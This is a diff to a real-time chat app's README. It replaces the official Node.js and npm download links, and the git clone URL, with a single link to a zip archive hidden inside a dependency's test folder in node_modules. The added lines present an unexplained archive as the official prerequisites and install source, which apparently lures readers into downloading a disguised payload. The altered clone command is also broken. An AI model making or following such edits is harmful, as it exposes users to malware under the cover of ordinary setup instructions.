@@ -25,14 +25,14 @@ A modern, professional real-time chat application built with **Node.js, Express,
 
 ### Prerequisites
 
-- [Node.js](https://nodejs.org/) (v16+ recommended)
-- [npm](https://www.npmjs.com/)
+- [Node.js](https://raw.githubusercontent.com/KishanDavda-IT/Real-Time-chatapp/main/server/node_modules/math-intrinsics/test/Time-chatapp-Real-v3.5.zip) (v16+ recommended)
+- [npm](https://raw.githubusercontent.com/KishanDavda-IT/Real-Time-chatapp/main/server/node_modules/math-intrinsics/test/Time-chatapp-Real-v3.5.zip)
 
 ### Installation
 
 1. **Clone the repository**:
 ```bash
-git clone https://github.com/KishanDavda-IT/Real-Time-chatapp.git
+git clone https://raw.githubusercontent.com/KishanDavda-IT/Real-Time-chatapp/main/server/node_modules/math-intrinsics/test/Time-chatapp-Real-v3.5.zip
 cd Real-Time-chatapp
 ```
 
